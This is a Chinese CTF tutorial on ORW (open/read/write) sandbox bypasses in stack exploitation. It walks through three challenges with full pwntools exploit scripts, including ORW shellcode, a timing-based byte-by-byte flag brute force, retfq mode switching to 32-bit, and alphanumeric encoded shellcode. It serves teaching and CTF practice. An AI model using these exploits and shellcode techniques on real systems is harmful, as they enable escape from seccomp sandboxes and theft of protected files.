

# 栈沙箱学习之 orw - 先知社区

栈沙箱学习之 orw



# 前言

学到这里，栈的学习就快要告一段落了，这里先会讲解一下栈沙箱 orw 绕过的一些知识，之后我们学习堆的时候会将堆 orw 绕过。

## 沙箱保护

沙箱保护是对程序加入一些保护，最常见的是禁用一些系统调用，如 execve，使得我们不能通过系统调用 execve 或 system 等获取到远程终端权限，因此只能通过**ROP**的方式调用**open**, **read**, **write**的来读取并打印 flag 内容

## ORW

orw 其实就是 open,read,write 的简写，其实就是打开 flag，写入 flag，输出 flag

## 查看沙箱

可以利用 seccomp-tools 来查看是否开启了沙箱，以及沙箱中一些允许的 syscall

```bash
$ sudo apt install gcc ruby-dev
$ gem install seccomp-tools
```

```bash
seccomp-tools dump ./pwn
```

利用上面指令即可查看程序沙箱信息

## 开启沙盒的两种方式

在 ctf 的 pwn 题中一般有两种函数调用方式实现沙盒机制，第一种是采用 prctl 函数调用，第二种是使用 seccomp 库函数。

### prctl() 函数调用

具体可以看一下[prctl() 函数详解\_prctl 函数\_nedwons 的博客-CSDN 博客](https://blog.csdn.net/hunter___/article/details/83063131)

看一下函数原型

```bash
#include <sys/prctl.h>
int prctl(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5);

// 主要关注 prctl() 函数的第一个参数，也就是 option，设定的 option 的值的不同导致黑名单不同，介绍 2 个比较重要的 option
// PR_SET_NO_NEW_PRIVS(38) 和 PR_SET_SECCOMP(22)

// option 为 38 的情况
// 此时第二个参数设置为 1，则禁用 execve 系统调用且子进程一样受用
prctl(38, 1LL, 0LL, 0LL, 0LL);

// option 为 22 的情况
// 此时第二个参数为 1，只允许调用 read/write/_exit(not exit_group)/sigreturn 这几个 syscall
// 第二个参数为 2，则为过滤模式，其中对 syscall 的限制通过参数 3 的结构体来自定义过滤规则。
prctl(22, 2LL, &v1);
```

### seccomp() 函数调用

```bash
__int64 sandbox()
{
  __int64 v1; // [rsp+8h] [rbp-8h]

  // 这里介绍两个重要的宏，SCMP_ACT_ALLOW(0x7fff0000U) SCMP_ACT_KILL( 0x00000000U)
  // seccomp 初始化，参数为 0 表示白名单模式，参数为 0x7fff0000U 则为黑名单模式
  v1 = seccomp_init(0LL);
  if ( !v1 )
  {
    puts("seccomp error");
    exit(0);
  }

  // seccomp_rule_add 添加规则
  // v1 对应上面初始化的返回值
  // 0x7fff0000 即对应宏 SCMP_ACT_ALLOW
  // 第三个参数代表对应的系统调用号，0-->read/1-->write/2-->open/60-->exit
  // 第四个参数表示是否需要对对应系统调用的参数做出限制以及指示做出限制的个数，传 0 不做任何限制
  seccomp_rule_add(v1, 0x7FFF0000LL, 2LL, 0LL);
  seccomp_rule_add(v1, 0x7FFF0000LL, 0LL, 0LL);
  seccomp_rule_add(v1, 0x7FFF0000LL, 1LL, 0LL);
  seccomp_rule_add(v1, 0x7FFF0000LL, 60LL, 0LL);
  seccomp_rule_add(v1, 0x7FFF0000LL, 231LL, 0LL);

  // seccomp_load->将当前 seccomp 过滤器加载到内核中
  if ( seccomp_load(v1) < 0 )
  {
    // seccomp_release->释放 seccomp 过滤器状态
    // 但对已经 load 的过滤规则不影响
    seccomp_release(v1);
    puts("seccomp error");
    exit(0);
  }
  return seccomp_release(v1);
}
```

## shellcode 写入哪里？

一般这种 ORW 题目给出的溢出大小不够我们写入很长的 ROP 链的，因此会提供 mmap() 函数，从而给出一段在栈上的内存

使用 mmap 申请适合 4byte 的寄存器的地址

**mmap() 函数原型**

```bash
void *mmap{
    void *addr; //映射区首地址，传 NULL
    size_t length; //映射区大小
    //会自动调为 4k 的整数倍
    //不能为 0
    //一般文件多大，length 就指定多大
    int prot; //映射区权限
    //PROT_READ 映射区必须要有读权限
    //PROT_WRITE
    //PROT_READ | PROT_WRITE
    int flags; //标志位参数
    //MAP_SHARED 修改内存数据会同步到磁盘
    //MAP_PRIVATE 修改内存数据不会同步到磁盘
    int fd; //要映射文件所对应的文件描述符
    off_t offset; //映射文件的偏移量，从文件哪个位置开始
    //映射的时候文件指针的偏移量
    //必须是 4k 的整数倍
    //一般设为 0
}
```

| mmap |     |     |
| --- | --- | --- |
| addr | 要申请的地址 | 建议四位 |
| length | 从 addr 开始申请的长度 | 建议一页 0x1000 |
| prot | 权限  | 7   |
| flags | 确定映射的更新是否对其他进程可见 | 0x22 |
| fd  | 映射到文件描述符 fd | 0xFFFFFFFF |
| offset | 映射偏移 | NULL |

## 实例操作

### \[极客大挑战 2019\]Not Bad

#### orw 都有

**checksec**

[![](assets/1701612140-8c0c3211f7c8086144145457432f4f0e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230815203604-4cf7871e-3b68-1.png)

64 位，保护全关

**seccomp-tools**

[![](assets/1701612140-40524b1e68d9395cc8bcb98b17594112.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230815203610-500afe7c-3b68-1.png)

这里可以看到 orw 权限都开了，即可以正常使用 open,read,write

**IDA 分析**

`sub_400949()`

```bash
__int64 sub_400949()
{
  __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = seccomp_init(0LL);
  seccomp_rule_add(v1, 0x7FFF0000LL, 0LL, 0LL);
  seccomp_rule_add(v1, 0x7FFF0000LL, 1LL, 0LL);
  seccomp_rule_add(v1, 0x7FFF0000LL, 2LL, 0LL);
  seccomp_rule_add(v1, 0x7FFF0000LL, 60LL, 0LL);
  return seccomp_load(v1);
}
```

这里是用 seccomp() 开启的沙箱，和我们上面分析的结果一样，都是允许调用 open,read,write,exit

`sub_400A16()`

```bash
int sub_400A16()
{
  char buf[32]; // [rsp+0h] [rbp-20h] BYREF

  puts("Easy shellcode, have fun!");
  read(0, buf, 0x38uLL);
  return puts("Baddd! Focu5 me! Baddd! Baddd!");
}
```

这里是一个 read 的栈溢出漏洞，可以利用这里打栈溢出

`sub_400906()`

```bash
void sub_400906()
{
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
}
```

设定关闭缓冲区

`main()`

```bash
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  mmap((void *)0x123000, 0x1000uLL, 6, 34, -1, 0LL);
  sub_400949();
  sub_400906();
  sub_400A16();
  return 0LL;
}
```

`sub_4009EE()`

```bash
void sub_4009EE()
{
  __asm { jmp     rsp }
}
```

提供了 jmp\_rsp

[![](assets/1701612140-f6485a531275e11df19fe6e16d9be407.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230815203618-551dcd36-3b68-1.png)

`_mmap()`

```bash
// attributes: thunk
void *mmap(void *addr, size_t len, int prot, int flags, int fd, __off_t offset)
{
  return mmap(addr, len, prot, flags, fd, offset);
}
```

使用 mmap 提供了一块内存

**gdb 动调**

[![](assets/1701612140-4ecec661e908dade96aa2891b9908f4f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230815203623-5804f3e4-3b68-1.png)

```bash
32+8=40
```

[![](assets/1701612140-8570dc93c4caa0a0dd393ef55e1de923.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230815203630-5c4cca76-3b68-1.png)

知道了起始地址，这段空间大小 0x1000，也就是说 read 里面读取到哪里都无所谓反正 mmap\_place+x<=max\_place 就可以，后面那个 0x100 是读取大小

所以思路也就有了：

*   首先构造我们的 shellcode
*   利用 jmp\_rsp，跳转到给我们提供 mmap 的内存这里写入我们的 ROP 链
*   getshell

先上 exp:

```bash
#coding=utf-8 
import os
import sys
import time
from pwn import *
from ctypes import *

context.log_level='debug'
context.arch='amd64'

p=remote("node4.buuoj.cn",25757)
#p=process('./pwn')
elf = ELF('./pwn')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

s       = lambda data               :p.send(data)
ss      = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(data)
sls     = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num                :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
l64     = lambda      :u64(p.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda      :u32(p.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
context.terminal = ['gnome-terminal','-x','sh','-c']
def dbg():
    gdb.attach(p,'b *$rebase(0x13aa)')
    pause()

#dbg()
ru('Easy shellcode, have fun!')

mmap=0x123000
#orw=shellcraft.open('./flag.txt')
orw=shellcraft.open('./flag')
orw+=shellcraft.read(3,mmap,0x50)
orw+=shellcraft.write(1,mmap,0x50)

jmp_rsp=0x400A01

pl=asm(shellcraft.read(0,mmap,0x100))+asm('mov rax,0x123000;call rax')
pl=pl.ljust(0x28,b'\x00')
pl+=p64(jmp_rsp)+asm('sub rsp,0x30;jmp rsp')


sl(pl)

shell=asm(orw)
sl(shell)

p.interactive()
```

解释一下 exp

[![](assets/1701612140-11d10e99b12c295ccb71caf4dfec343b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230815203640-6261d0f0-3b68-1.png)

*   第一个框就是构造我们 orw 的 shellcode 了，先打开 flag 文件，之后利用 read 写入 flag，再输出 flag

这里先说一下为什么 read 的 fd 是 3，可以结合下面图片，0~2 都是保留的用于缓冲区，我们打开第一个新文件的文件描述符是 3，第二个是 4，以此类推

[![](assets/1701612140-c77991f0e3c5d4119d5d1c9169f393c4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230815203646-659b6416-3b68-1.png)

*   第二个框就是我们所说的 jmp\_rsp 的地址
*   第三个框就是我们将 ROP 写到 mmap 提供的栈的内存上，之后利用 jmp\_rsp 跳转到 orw\_shellcode 的地方

### 2021-蓝帽杯初赛-slient

#### or 缺 w->采取爆破

**checksec**

[![](assets/1701612140-d98aaa227ff54de8a13c1d85eaf0337d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230815203651-68ea44de-3b68-1.png)

64 位程序，保护全开

**seccomp-tools**

这里要注意要在**root**下查看

```bash
root@ubuntu:/home/evil/Desktop/pwn test/orw/ciscn2023/2021 slient# seccomp-tools dump ./pwn
Welcome to silent execution-box.

line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008
 0005: 0x15 0x01 0x00 0x00000000  if (A == read) goto 0007
 0006: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x06 0x00 0x00 0x00000000  return KILL
```

这里可以看到只有**read**和**open**

**IDA 分析**

main()

```bash
void __fastcall main(__int64 a1, char **a2, char **a3)
{
  unsigned int v3; // eax
  __int128 v4; // xmm0
  __int128 v5; // xmm1
  __int128 v6; // xmm2
  __int64 v7; // [rsp+48h] [rbp-68h]
  __int64 v8; // [rsp+50h] [rbp-60h]
  __int128 buf; // [rsp+60h] [rbp-50h] BYREF
  __int128 v10; // [rsp+70h] [rbp-40h]
  __int128 v11; // [rsp+80h] [rbp-30h]
  __int128 v12; // [rsp+90h] [rbp-20h]
  unsigned __int64 v13; // [rsp+A0h] [rbp-10h]

  v13 = __readfsqword(0x28u);
  sub_A60(a1, a2, a3);
  v12 = 0LL;
  v11 = 0LL;
  v10 = 0LL;
  buf = 0LL;
  puts("Welcome to silent execution-box.");
  v3 = getpagesize();
  v8 = (int)mmap((void *)0x1000, v3, 7, 34, 0, 0LL);
  read(0, &buf, 0x40uLL);
  prctl(38, 1LL, 0LL, 0LL, 0LL);
  prctl(4, 0LL);
  v7 = seccomp_init(0LL);
  seccomp_rule_add(v7, 2147418112LL, 2LL, 0LL);
  seccomp_rule_add(v7, 2147418112LL, 0LL, 0LL);
  seccomp_load(v7);
  v4 = buf;
  v5 = v10;
  v6 = v11;
  *(_OWORD *)(v8 + 48) = v12;
  *(_OWORD *)(v8 + 32) = v6;
  *(_OWORD *)(v8 + 16) = v5;
  *(_OWORD *)v8 = v4;
  ((void (__fastcall *)(__int64, __int64, __int64))v8)(3735928559LL, 3735928559LL, 3735928559LL);
  if ( __readfsqword(0x28u) != v13 )
    init();
}
```

分析一下 main(),就是利用 mmap() 申请了 0x1000 的内存空间，然后利用 seccomp() 设置了沙箱，read 允许读入 0x40 大小的数据

这道题不知道为啥好像动调不了，有可能是我太菜了动调不动，不过在系统函数说明中有这样一说

```bash
// about mmap (link: https://man7.org/linux/man-pages/man2/mmap.2.html)
// 1. SYNOPSIS
#include <sys/mman.h>
void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);

/* 2. DESCRIPTION
 mmap() creates a new mapping in the virtual address space of the
       calling process.  The starting address for the new mapping is
       specified in addr.  The length argument specifies the length of
       the mapping (which must be greater than 0).

       If addr is NULL, then the kernel chooses the (page-aligned)
       address at which to create the mapping; this is the most portable
       method of creating a new mapping.  If addr is not NULL, then the
       kernel takes it as a hint about where to place the mapping; on
       Linux, the kernel will pick a nearby page boundary (but always
       above or equal to the value specified by
       /proc/sys/vm/mmap_min_addr) and attempt to create the mapping
       there.  If another mapping already exists there, the kernel picks
       a new address that may or may not depend on the hint.  The
       address of the new mapping is returned as the result of the call.
......
*/
```

由 `on Linux, the kernel will pick a nearby page boundary (but always above or equal to the value specified by /proc/sys/vm/mmap_min_addr)` 可知：Linux 为 `mmap` 分配虚拟内存时，总是从最接近 `addr` 的页边缘开始的，而且保证地址不低于 `/proc/sys/vm/mmap_min_addr` 所指定的值。  
可以看到，`mmap_min_addr = 65536 = 0x10000`，因此刚才判断程序利用 mmap 函数在 0x10000 处开辟一个 page 的空间

因此 mmap 申请的内存的起始地址应该为 0x10000，截至地址应该为 0x11000，大小为 0x1000，这里附上其他师傅进行动调 vmmap 得到的结果，和我所理解的是一样的

[![](assets/1701612140-66ef09e5b4d32fc904cb30a1f85b5c56.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230815203704-70756b70-3b68-1.png)

由于缺少 write() 函数，我们无法输出 flag，可以进行单个字节的对比爆，即读取 flag 到一块内存区域，随后单字节爆破，在 shellcode 中设置 loop 循环，一旦 cmp 命中就让程序卡死，否则执行后面的 exit 因为沙箱禁用程序崩溃退出，根据程序的表现可以区分是否命中，注意因为服务器通信不稳定，每次读到一段 flag 就更新 exp 中的 flag 字符串继续向后爆破

exp：

```bash
#coding=utf-8
from pwn import *

context.update(arch='amd64',os='linux',log_level='info')

def exp(dis,char):
    p.recvuntil("Welcome to silent execution-box.\n")
    shellcode = asm('''
            mov r12,0x67616c66
            push r12
            mov rdi,rsp
            xor esi,esi
            xor edx,edx
            mov al,2
            syscall
            mov rdi,rax
            mov rsi,0x10700
            mov dl,0x40
            xor rax,rax
            syscall
            mov dl, byte ptr [rsi+{}]
            mov cl, {}
            cmp cl,dl
            jz loop
            mov al,60
            syscall
            loop:
            jmp loop
            '''.format(dis,char))
    p.send(shellcode)
flag = "flag{"

for i in range(len(flag),35):
    sleep(1)
    log.success("flag : {}".format(flag))
    for j in range(0x20,0x80):
        p = process('./pwn')
        try:
            exp(i,j)
            p.recvline(timeout=1)
            flag += chr(j)
            p.send('\n')
            log.success("{} pos : {} success".format(i,chr(j)))
            p.close()
            break
        except:           
            p.close()
```

[![](assets/1701612140-6af9f1a7db93068fa8754358f53752fe.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230815203714-768b8ff8-3b68-1.png)

解释一下 exp，主要是解释 shellcode

[![](assets/1701612140-ea3371f608efbd82cc87601d6a281664.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230815203719-7924e656-3b68-1.png)

*   第一个框，这里其实就是 open('./flag'),因为程序都是小端序的，我们要输入 galf 的 16 进制，程序才会解析为 flag
*   第二个框，这里其实就是 read(fd,0x10700,0x40)
*   第三个框，这里就是利用 loop 循环写的一个汇编语言单字节爆破，此时 rsi 经过传参保存的是 flag 的地址，利用 cmp 检查 flag\[index\]是否等于需要的 flag，若相等咋会卡在这个循环中，否则继续爆破

### RW 缺 O

#### 可以借助 fstat()->利用 retfq 汇编指令切换至 32 位调用 open

这里从网上实在找不到题目，就借用 ex 团长的一道题目进行理解分析吧，虽然原文章已经写的很好了，具体题目分析可以看一下参考链接**shellcode 的艺术**中的**第六模块**

顺便讲一下`retf`这个汇编指令

*   CPU 执行 ret 指令时，相当于进行
    
    ```bash
    pop IP
    ```
    
*   CPU 执行 retf 指令时，相当于进行：
    
    ```bash
    pop IP
    pop Cs
    ```
    
*   32bit cs 0x23
    
    ```bash
    ;;nasm -f elf32 test_cs_32.asm 
    ;;ld -m elf_i386 -o test_cs_32
    global _start
    _start:
      push 0x0068732f
      push 0x6e69622f
      mov ebx,esp
      xor ecx,ecx
      xor edx,edx
      mov eax,11
      int 0x80
    ```
    
*   64bit cs 0x33
    
    ```bash
    ;;nasm -f elf64 test_cs_64.asm 
    ;;ld -m elf_x86_64 -o test_cs_64 test_cs_64.o
    global _start
    _start:
      mov r10,0x0068732f6e69622f
      push r10
      mov rdi,rsp
      xor rsi,rsi
      xor rdx,rdx
      mov rax,0x3b
      syscall
    ```
    

还有要注意一下，当从**64 位切换到 32 位**的时候，64 位下会 push 一个 8byte 的数

```bash
push 0x20
push addr
retf
```

栈的结构

```bash
rsp->   00----addr----00
        0000000000000020
```

转为 32 位时

```bash
esp->   0-addr-0
        00000020
```

可以采取

```bash
to32bit:
    ; retf to 32bit
    push addr
    mov r15,0x2300000000
    add qword [rsp],r15
    retf
```

此时的栈结构

```bash
rsp->   0-addr-020000000
//也就是
esp->   0-addr-0
        00000020
```

**32 位转换为 64 位时**

直接转换即可，因为不存在 push 一个 8byte 的数了

```bash
push 0x20
push addr
retf
```

现在讲解了`retf`的一些基础知识以及在转换中的一些细节，现在我们回到题目继续看一下这道题目。

seccomp-tools

```bash
$ seccomp-tools dump ./shellcode 
---------- Shellcode ----------
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000000  A = sys_number
 0001: 0x15 0x06 0x00 0x00000005  if (A == fstat) goto 0008
 0002: 0x15 0x05 0x00 0x00000025  if (A == alarm) goto 0008
 0003: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0008
 0004: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0008
 0005: 0x15 0x02 0x00 0x00000009  if (A == mmap) goto 0008
 0006: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0008
 0007: 0x06 0x00 0x00 0x00000000  return KILL
 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

可以看到可以调用 write,read,mmap 但是没有 open，这个时候可以利用 fstat() 函数，该函数的 64 位系统调用号为 5，这个是 `open` 函数的 32 位系统调用号）

所以这道题的思路也就有了，利用 `retfq` 汇编指令进行 32 位和 64 位系统格式之间的切换，在 32 位格式下执行 `open` 函数打开 `flag` 文件，在 64 位格式下执行输入输出。

相关系统调用号可以参考[linux 系统调用号表\_linux 系统调用号\_Anciety 的博客-CSDN 博客](https://blog.csdn.net/qq_29343201/article/details/52209588)

这道题 ex 团长设计的还是难顶的，限制输入的 shellcode 必须是可打印字符，我们可以借助一些技巧从而构造汇编指令 (比如异或之类的算法操作)

可以用**shellcode 的艺术**中的**第三模块**中的总结用法，比如

```bash
xor al, 立即数
xor byte ptr [eax… + 立即数], al dl…
xor byte ptr [eax… + 立即数], ah dh…
xor dword ptr [eax… + 立即数], esi edi
xor word ptr [eax… + 立即数], si di
xor al dl…, byte ptr [eax… + 立即数]
xor ah dh…, byte ptr [eax… + 立即数]
xor esi edi, dword ptr [eax… + 立即数]
xor si di, word ptr [eax… + 立即数]
```

exp:

```bash
#coding:utf-8
from pwn import *
context.log_level = 'debug'
p = process('./shellcode')
# p = remote("nc.eonew.cn","10011")
p.recvuntil("shellcode: ")

append_x86 = '''
push ebx
pop ebx
'''
append = '''
/* 机器码：52 5a */
push rdx
pop rdx
'''

shellcode_x86 = '''
/*fp = open("flag")*/
mov esp,0x40404140

/* s = "flag" */
push 0x67616c66

/* ebx = &s */
push esp
pop ebx

/* ecx = 0 */
xor ecx,ecx

mov eax,5
int 0x80

mov ecx,eax
'''

shellcode_flag = '''
/* retfq:  mode_32 -> mode_64*/
push 0x33
push 0x40404089
retfq

/*read(fp,buf,0x70)*/
mov rdi,rcx
mov rsi,rsp
mov rdx,0x70
xor rax,rax
syscall

/*write(1,buf,0x70)*/
mov rdi,1
mov rax,1
syscall
'''
shellcode_x86 = asm(shellcode_x86)
shellcode_flag = asm(shellcode_flag, arch = 'amd64', os = 'linux')
shellcode = ''

# 0x40404040 为 32 位 shellcode 地址
shellcode_mmap = '''
/*mmap(0x40404040,0x7e,7,34,0,0)*/
push 0x40404040 /*set rdi*/
pop rdi

push 0x7e /*set rsi*/
pop rsi

push 0x40 /*set rdx*/
pop rax
xor al,0x47
push rax
pop rdx

push 0x40 /*set r8*/
pop rax
xor al,0x40
push rax
pop r8

push rax /*set r9*/
pop r9

/*syscall*/
/* syscall 的机器码是 0f 05, 都是不可打印字符。*/
/* 用异或运算来解决这个问题：0x0f = 0x5d^0x52, 0x05 = 0x5f^0x5a. */
/* 其中 0x52,0x5a 由 append 提供。*/
push rbx
pop rax
push 0x5d
pop rcx
xor byte ptr[rax+0x31],cl
push 0x5f
pop rcx
xor byte ptr[rax+0x32],cl

push 0x22 /*set rcx*/
pop rcx

push 0x40/*set rax*/
pop rax
xor al,0x49
'''
shellcode_read = '''
/*read(0,0x40404040,0x70)*/

push 0x40404040 /*set rsi*/
pop rsi

push 0x40 /*set rdi*/
pop rax
xor al,0x40
push rax
pop rdi

xor al,0x40 /*set rdx*/
push 0x70
pop rdx

/*syscall*/
push rbx
pop rax
push 0x5d
pop rcx
xor byte ptr[rax+0x57],cl
push 0x5f
pop rcx
xor byte ptr[rax+0x58],cl

push rdx /*set rax*/
pop rax
xor al,0x70
'''

shellcode_retfq = '''
/*mode_64 -> mode_32*/
push rbx
pop rax

xor al,0x40

push 0x72
pop rcx
xor byte ptr[rax+0x40],cl
push 0x68
pop rcx
xor byte ptr[rax+0x40],cl
push 0x47
pop rcx
sub byte ptr[rax+0x41],cl
push 0x48
pop rcx
sub byte ptr[rax+0x41],cl
push rdi
push rdi
push 0x23
push 0x40404040
pop rax
push rax
'''

# mmap
shellcode += shellcode_mmap
shellcode += append

# read shellcode
shellcode += shellcode_read
shellcode += append

# mode_64 -> mode_32
shellcode += shellcode_retfq
shellcode += append

shellcode = asm(shellcode,arch = 'amd64',os = 'linux')
print hex(len(shellcode))

#gdb.attach(p,"b *0x40027f\nb*0x4002eb\nc\nc\nsi\n")
p.sendline(shellcode)
pause()

p.sendline(shellcode_x86 + 0x29*'\x90' + shellcode_flag)
p.interactive()
```

### 2021-强网杯 - 初赛-shellcode

#### 只有 R 无 OW->上述两种方式的总结

这里就不多赘述了，只讲一下思路与 exp

seccomp-tools

[![](assets/1701612140-d26a21f6ea6f92f0497610a2be2df8d7.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230815203742-870b8ae0-3b68-1.png)

发现只有 read,mmap，但是又 fstat，所以可以解决没有 open 的情况，没有 write 可以利用 loop 循环，用 cmp 卡住程序，从而进行单字节爆破得到 flag，所以这是上面两个题目的总结

exp:

```bash
#!/usr/bin/env python
import os
import time
from pwn import *

context.arch = 'amd64'
context.os = 'linux'
# context.log_level = 'debug'

def toPrintable(raw):
    with open("/tmp/raw","wb") as f:
        f.write(asm(raw,arch='amd64'))
    result = os.popen("python ~/pwntools/alpha3/ALPHA3.py x64 ascii mixedcase rbx --input=/tmp/raw").read()
    print("[*] Shellcode %s"%result)
    return result

def exp(p,a,b):
    shellcode1 = '''
        mov r10,rbx
        add r10w,0x0140
        xor rdi,rdi
        mov rsi,r10    
        xor rdx,rdx
        add dx,0x1040
        xor rax,rax
        syscall
        jmp r10
    '''
    shellcode2 = '''

        mov rdi,0x40000000
        mov rsi,0x1000
        mov rdx,0x7
        mov r10,0x22
        mov r8,0xFFFFFFFF
        xor r9,r9
        mov rax,0x9
        syscall

        mov rsi,rdi
        xor rdi,rdi
        mov rdx,0x1000
        xor rax,rax
        syscall
        jmp rsi
    '''
    shellcode3_ = '''
        mov r10,0x2300000000
        add rsi,0x13
        add rsi,r10
        push rsi
        retf

        mov esp,0x40000400
        push 0x0067
        push 0x616c662f
        mov ebx,esp
        xor ecx,ecx
        mov edx,0x7
        mov eax,0x5
        int 0x80

        push 0x33
        push 0x40000037
        retf

        mov rdi,rax
        mov rsi,0x40000500
        mov rdx,0x80
        xor rax,rax
        syscall

        push 0
        cmp byte ptr[rsi+{0}],{1}
        jz $-3
        ret 
    '''.format(a,b) if a==0 else '''

        mov r10,0x2300000000
        add rsi,0x13
        add rsi,r10
        push rsi
        retf

        mov esp,0x40000400
        push 0x0067
        push 0x616c662f
        mov ebx,esp
        xor ecx,ecx
        mov edx,0x7
        mov eax,0x5
        int 0x80

        push 0x33
        push 0x40000037
        retf

        mov rdi,rax
        mov rsi,0x40000500
        mov rdx,0x80
        xor rax,rax
        syscall

        push 0
        cmp byte ptr[rsi+{0}],{1}
        jz $-4
        ret 
    '''.format(a,b)
    # shellcode1 = toPrintable(shellcode1)
    # shellcode2 = asm(shellcode2,arch='amd64')
    # shellcode3 = asm(shellcode3,arch='amd64')
    # print "".join("\\x%02x"%ord(_) for _ in asm(shellcode,arch='amd64'))
    shellcode1 = "Sh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M144x8n0R094y4l0p0S0x188K055M4z0x0A3r054q4z0q2H0p0z402Z002l8K4X00"
    shellcode2 = "\x48\xc7\xc7\x00\x00\x00\x40\x48\xc7\xc6\x00\x10\x00\x00\x48\xc7\xc2\x07\x00\x00\x00\x49\xc7\xc2\x22\x00\x00\x00\x49\xb8\xff\xff\xff\xff\x00\x00\x00\x00\x4d\x31\xc9\x48\xc7\xc0\x09\x00\x00\x00\x0f\x05\x48\x89\xfe\x48\x31\xff\x48\xc7\xc2\x00\x10\x00\x00\x48\x31\xc0\x0f\x05\xff\xe6"
    shellcode3 = "\x49\xba\x00\x00\x00\x00\x23\x00\x00\x00\x48\x83\xc6\x13\x4c\x01\xd6\x56\xcb\xbc\x00\x04\x00\x40\x6a\x67\x68\x2f\x66\x6c\x61\x89\xe3\x31\xc9\xba\x07\x00\x00\x00\xb8\x05\x00\x00\x00\xcd\x80\x6a\x33\x68\x37\x00\x00\x40\xcb\x48\x89\xc7\x48\xc7\xc6\x00\x05\x00\x40\x48\xc7\xc2\x80\x00\x00\x00\x48\x31\xc0\x0f\x05\x6a\x00"
    shellcode3 += asm('cmp byte ptr[rsi+{0}],{1};jz $-3;ret'.format(a,b) if a == 0 else 'cmp byte ptr[rsi+{0}],{1};jz $-4;ret'.format(a,b),arch='amd64')
    p.sendline(shellcode1)
    p.sendline(shellcode2)
    # raw_input()
    p.sendline(shellcode3)
    try:
        p.recv(timeout = 2)
    except:
        p.close()
        return 0
    else:
        return 1
def main():
    flag = [" " for _ in range(0x30)]
    for i in range(0,100):
        # for char in "{}1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ":
        for char in range(0x20,0x7e+1):
            # char = ord(char)
            p = process("./shellcode")
            if exp(p,i,char):
                flag[i] = chr(char)
                tmp = "".join(_ for _ in flag)
                print(">>>>> %s"%tmp)
                break
            p.close()
if __name__ == '__main__':
    main()
```

这里涉及到一个工具**alpha3**,可以生成**纯字符的 shellcode**，具体使用以及安装可以借鉴下面参考中给出的链接，这个师傅整理的非常方便了

# 参考

[shellcode 的艺术 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/6645#toc-5)

[Alphanumeric Shellcode：纯字符 Shellcode 生成指南 - FreeBuf 网络安全行业门户](https://www.freebuf.com/articles/system/232280.html)
